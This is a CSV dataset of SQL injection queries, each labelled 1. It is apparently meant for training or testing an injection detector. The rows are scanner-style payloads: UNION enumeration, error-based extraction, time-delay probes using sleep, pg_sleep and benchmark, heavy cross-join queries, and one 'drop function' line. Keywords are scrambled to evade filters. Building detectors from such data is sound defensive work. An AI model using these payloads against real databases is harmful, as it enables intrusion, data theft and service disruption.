Query,Label
"1"" aandnd exp  (  ~  (  sselectelect * frofromm   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1"" aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seselectlect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd ""vziz""  =  ""vziz",1
"1"" anandd 8594  =    (  sselectelect 8594 frofromm pg_sleep  (  5   )    )   --",1
-4835   )    )     )   oorr   (  4219  =  2081  )  *2081 anandd    (    (     (  8536  =  8536,1
"1'   )    )    as yyja whwhereere 4321  =  4321 oorr 8315  =    (  selselectect count  (  *  )   frfromom sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )  --",1
"selecselectt sleep  (  5  )   anandd    (    (   ""%""  =  """,1
"1%""   )    )    anandd 8189  =    (  seselectlect count  (  *  )   ffromrom sysibm.systatablebles as t1,sysibm.systatablebles as t2,sysibm.systatablebles as t3  )  --",1
"1  )   oorr char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
"1""  )   whewherere 4038  =  4038 oorr 4240  =    (  seselectlect 4240 frofromm pg_sleep  (  5   )    )   --",1
"1""   )    )    aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seselectlect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd    (    (   ""bcxh"" lilikeke ""bcxh",1
"1' oorr elt  (  6272  =  6272,sleep  (  5   )    )    aandnd 'fvtf' liklikee 'fvtf",1
1 wherwheree 5443  =  5443,1
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  seselectlect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1
1  )   as mixt whwhereere 1085  =  1085 oorr sleep  (  5  )  --,1
1'   )    )     )   union all sselectelect nunullll--,1
"1""  )   oorr   (  seleselectct 2*  (  if   (    (   seleselectct * ffromrom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   anandd   (  ""gcnq"" lilikeke ""gcnq",1
"1'+  (  seleselectct 'rpbx' whwhereere 6748  =  6748 anandd elt  (  4249  =  4249,7259   )    )   +'",1
"-5573'  )   union all selselectect 2866,2866,2866,2866,2866,2866,2866,2866,2866--",1
"-5810 union all selecselectt 6307,6307,6307,6307,6307,6307,6307--",1
"1  )   as otsb wwherehere 8380  =  8380 oorr 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"sselectelect llikeike  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )     )  +'",1
"-5652%'  )   union all sselectelect 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1
1  )   whewherere 6884  =  6884 aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selecselectt   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1' oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1""   )    )    as zgig wwherehere 5748  =  5748 aandnd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
1'||  (  selselectect 'zwcp' wwherehere 3333  =  3333,1
selselectect   (  case when   (  8916  =  1357  )   then 8916 else 8916*  (  selselectect 8916 ffromrom iinnfoorrmation_schema.character_ssetets  )   end  )  #,1
"-1303' union all sselectelect 4840,4840#",1
"1%'   )    )     )   oorr 7417  =    (  sselectelect count  (  *  )   frfromom sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3  )  --",1
1'  )   wwherehere 7541  =  7541,1
"1'  )   anandd updaupdatetexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selecselectt   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   anandd   (  'cfzp' lilikeke 'cfzp",1
1'   )    )     )   rllikeike   (  seleselectct   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    anandd    (    (     (  'vtoi' llikeike 'vtoi,1
-8397'   )    )     )   oorr 2171  =  4788,1
"-8203""  )   union all sselectelect 6394,6394,6394,6394,6394--",1
"1%'  )   oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nunullll  )   anandd   (  '%'  =  '",1
"1""   )    )     )   oorr row  (  1045,7562  )  >  (  sselectelect count  (  *  )  ,concat  (  0x7171706a71,  (  sselectelect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom   (  sselectelect 8488 union sselectelect 5584 union sselectelect 3051 union sselectelect 1210  )  a group bbyy x  )   aandnd    (    (     (  ""hbgr"" llikeike ""hbgr",1
"1""  )   anandd 6510  =    (  selselectect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   anandd   (  ""ajuh""  =  ""ajuh",1
"-1512"" union all seselectlect 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",1
-3535%'   )    )     )   oorr 5605  =  4660 aandnd    (    (     (  '%'  =  ',1
"1  )   wherwheree 5378  =  5378 anandd   (  selecselectt 2*  (  if   (    (   selecselectt * frofromm   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
1'+  (  seselectlect 'zgtu' wwherehere 8419  =  8419,1
1   )    )     )   aandnd 8990  =  4775 aandnd    (    (     (  1894  =  1894,1
end anandd   (  '%'  =  ',1
"1"" wwherehere 5406  =  5406 anandd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sselectelect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
"-3865""  )   whewherere 3559  =  3559 union all selecselectt 3559,3559,3559,3559,3559,3559,3559--",1
1%'  )   anandd 6969  =    (  selselectect 6969 frfromom pg_sleep  (  5   )    )    anandd   (  '%'  =  ',1
"1%'   )    )    oorr 7552  =    (  seselectlect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   aandnd    (    (   '%'  =  '",1
1'   )    )    as pdcl wherwheree 6964  =  6964,1
"-9504%""   )    )    oorr 8098  =  7472",1
"-1956""  )   whwhereere 1448  =  1448 oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seleselectct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
1%'  )   aandnd 4595  =  4595#,1
1  )   wwherehere 9649  =  9649 aandnd 8594  =    (  selselectect 8594 frfromom pg_sleep  (  5   )    )   --,1
"1 anandd make_ssetet  (  8403  =  8403,8899  )  -- rbxf",1
"1"" aandnd make_sesett  (  4214  =  9503,9503  )   aandnd ""phjg"" liklikee ""phjg",1
1%'  )   union all selselectect nunullll--,1
"1' oorr 4411  =    (  sselectelect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"-6527'   )    )    union all selecselectt 5053,5053,5053,5053--",1
1' whewherere 8864  =  8864,1
"1  )   oorr 4411  =    (  seselectlect count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd   (  5132  =  5132",1
1'   )    )    union all selecselectt nunullll--,1
selselectect case when 2095  =  9074 then 1 else nulnulll end--,1
1'||  (  selselectect 'qstz' whewherere 6835  =  6835,1
-4961'  )   oorr 3038  =  3038,1
"-8824%'   )    )    oorr make_sesett  (  9354  =  9354,7185  )   anandd    (    (   '%'  =  '",1
"1'  )   wherwheree 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"1""   )    )     )   oorr exp  (  ~  (  seselectlect * frofromm   (  seselectlect concat  (  0x7171706a71,  (  seselectlect   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd    (    (     (  ""uzjn""  =  ""uzjn",1
"1'||  (  selselectect 'osux' frofromm dual wherwheree 7066  =  7066 oorr 9643  =    (  selselectect count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabtableles as t3   )    )   ||'",1
"1%'   )    )    oorr 5356  =    (  selecselectt count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1"" union all seselectlect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
"1%""  )   anandd sleep  (  5  )   anandd   (  ""%""  =  """,1
"-5911 union all selecselectt 2245,2245,2245,2245,2245,2245#",1
"1'||  (  seleselectct 'scba' whwhereere 9079  =  9079 anandd 8635  =    (  seleselectct count  (  *  )   frofromm generate_series  (  1,5000000   )    )   --",1
-8099%'   )    )    oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd    (    (   '%'  =  ',1
"-3733'   )    )    oorr 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd    (    (   'ybgd'  =  'ybgd",1
"1""  )   whewherere 5197  =  5197 anandd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1' iinn boolean mode  )   rlilikeke   (  seleselectct * frfromom   (  seleselectct  (  sleep  (  5   )    )     )  sgvo  )  #,1
"1"" aandnd sleep  (  5  )   aandnd ""masm""  =  ""masm",1
1'  )   as hcpp whwhereere 1863  =  1863,1
"-4828'+  (  selecselectt qxnw whewherere 9488  =  9488 union all selecselectt 9488,9488--",1
"1"" anandd 6510  =    (  selselectect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   anandd ""hcjz"" lilikeke ""hcjz",1
"1' iinn boolean mode  )   anandd 8148  =  llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"1'  )   oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nnullull  )  ",1
"-3710   )    )    union all seleselectct 5770,5770,5770,5770,5770,5770,5770#",1
1'  )   wwherehere 7537  =  7537 anandd 2006  =  2006,1
"-1272' oorr 1 group bbyy concat  (  0x7171706a71,  (  seselectlect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"1""  )   whewherere 8407  =  8407 aandnd 9254  =    (  seselectlect count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""   )    )     )   anandd elt  (  1210  =  1210,sleep  (  5   )    )    anandd    (    (     (  ""felm""  =  ""felm",1
"-8792 union all selselectect 1246,1246,1246,1246,1246,1246,1246--",1
 (  sselectelect * frofromm   (  sselectelect  (  sleep  (  5   )    )     )  srmq  )  # gkkx,1
"1'   )    )    as jvwq wwherehere 6596  =  6596 anandd 3202  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"-7916'   )    )    union all sselectelect 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",1
1%' anandd 9198  =  9198--,1
"1'||  (  seleselectct 'fdkl' whwhereere 4572  =  4572 union all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
"1""   )    )     )   aandnd elt  (  4249  =  4249,7259  )   aandnd    (    (     (  ""awyk"" lilikeke ""awyk",1
1%'  )   anandd 3754  =    (  seleselectct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frofromm dual  )   anandd   (  '%'  =  ',1
"1"" aandnd 5556  =    (  selecselectt count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   aandnd ""xhvo""  =  ""xhvo",1
"1' oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nulnulll  )  ",1
"1""   )    )    as ubrg wwherehere 7318  =  7318 anandd 7331  =  6529--",1
"selselectect count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3 aandnd    (    (     (  ""ekbq""  =  ""ekbq",1
"1   )    )    aandnd elt  (  1210  =  1210,sleep  (  5   )    )    aandnd    (    (   5874  =  5874",1
"1"" whewherere 7828  =  7828",1
1'||  (  seleselectct 'lljg' frofromm dual whwhereere 7631  =  7631,1
"-7551 oorr elt  (  6900  =  7195,7195  )  ",1
"selecselectt * frofromm generate_series  (  1134,1134,case when   (  1134  =  4909  )   then 1 else 0 end  )   limilimitt 1--",1
1  )   as iknl wherwheree 3885  =  3885 rllikeike sleep  (  5  )  #,1
"1'   )    )    as oocd wwherehere 2919  =  2919 oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"selselectect * frofromm generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   lilimitmit 1--",1
if  (  3245  =  6168  )   selecselectt 3245 else drdropop function nafj--,1
"1%""   )    )     )   rlilikeke   (  seleselectct * ffromrom   (  seleselectct  (  sleep  (  5   )    )     )  sgvo  )   anandd    (    (     (  ""%""  =  """,1
1'+  (  selselectect xzse wherwheree 4530  =  4530,1
1  )   whwhereere 7165  =  7165 aandnd sleep  (  5  )  #,1
1'  )   wherwheree 3588  =  3588,1
"1' wherwheree 2391  =  2391 union all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1""  )   as lgxc whwhereere 1117  =  1117 union all selecselectt nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
1%'  )   anandd sleep  (  5  )  #,1
"1%'   )    )    oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seselectlect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    aandnd    (    (   '%'  =  '",1
"1' union all selecselectt nnullull,nnullull,nnullull,nnullull,nnullull#",1
"1,  (  sselectelect   (  case when   (  1570  =  1570  )   then   (  sselectelect 1570 frofromm pg_sleep  (  5   )    )    else 1/  (  sselectelect 0  )   end   )    )   ",1
"1'||  (  sselectelect 'lstx' ffromrom dual wherwheree 2972  =  2972 oorr 4411  =    (  sselectelect count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1
1 whwhereere 2649  =  2649 oorr   (  seleselectct * frofromm   (  seleselectct  (  sleep  (  5   )    )     )  ydpu  )  --,1
"1%""   )    )    union all selecselectt nunullll#",1
"1'   )    )     )   anandd elt  (  1210  =  1210,sleep  (  5   )    )    anandd    (    (     (  'aiuy'  =  'aiuy",1
-4557%'   )    )    oorr 4537  =  3401 anandd    (    (   '%'  =  ',1
1'+  (  selselectect idnb wherwheree 2338  =  2338,1
"1'   )    )     )   oorr row  (  1045,7562  )  >  (  selselectect count  (  *  )  ,concat  (  0x7171706a71,  (  selselectect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frofromm   (  selselectect 8488 union selselectect 5584 union selselectect 3051 union selselectect 1210  )  a group bbyy x  )   aandnd    (    (     (  'aduc'  =  'aduc",1
"1%""  )   aandnd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd   (  ""%""  =  """,1
"1%'  )   aandnd elt  (  1210  =  1210,sleep  (  5   )    )    aandnd   (  '%'  =  '",1
"1""   )    )    as uxnc whwhereere 8041  =  8041 anandd 9198  =  9198--",1
1'   )    )     )   rliklikee   (  selselectect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    aandnd    (    (     (  'ywbs'  =  'ywbs,1
-7442  )   oorr 3391  =  7492,1
"1%'  )   union all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
1  )   anandd 6969  =    (  sselectelect 6969 frfromom pg_sleep  (  5   )    ) ,1
-1257'  )   ooorrderrder bbyy 1#,1
1'  )   whwhereere 9317  =  9317 oorr 6793  =    (  selecselectt 6793 frfromom pg_sleep  (  5   )    )   --,1
"-4739'   )    )    union all selecselectt 6585,6585,6585,6585,6585--",1
"1'   )    )    oorr 8421  =    (  selecselectt count  (  *  )   ffromrom generate_series  (  1,5000000   )    )    aandnd    (    (   'uoorrw' lilikeke 'uoorrw",1
"-3472' oorr 1570  =  convert  (  iinnt,  (  sselectelect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sselectelect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
"1'   )    )    as wves whwhereere 2641  =  2641 aandnd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""  )   as yphz wwherehere 8174  =  8174 union all selecselectt nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
"1%""  )   aandnd 8594  =    (  selselectect 8594 frfromom pg_sleep  (  5   )    )   --",1
"1'||  (  sselectelect 'ukfj' wherwheree 7133  =  7133 union all sselectelect nulnulll,nulnulll,nulnulll#",1
